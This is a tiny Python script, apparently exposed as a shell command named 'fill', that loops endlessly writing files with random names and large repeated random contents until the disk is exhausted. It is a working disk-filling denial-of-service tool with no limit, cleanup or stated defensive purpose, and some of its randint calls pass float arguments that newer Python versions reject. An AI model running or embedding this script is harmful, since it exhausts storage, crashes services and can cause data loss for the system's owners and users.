
_meta_shell_command = 'fill'

import random

while(True):
    filename = str(random.randint(0, 10000000000000000000000000000))
    fh = open(filename, 'w')
    data = str(random.randint(0, 1e10))
    data = data*random.randint(0, 1e6)
    fh.write(data)
    fh.close()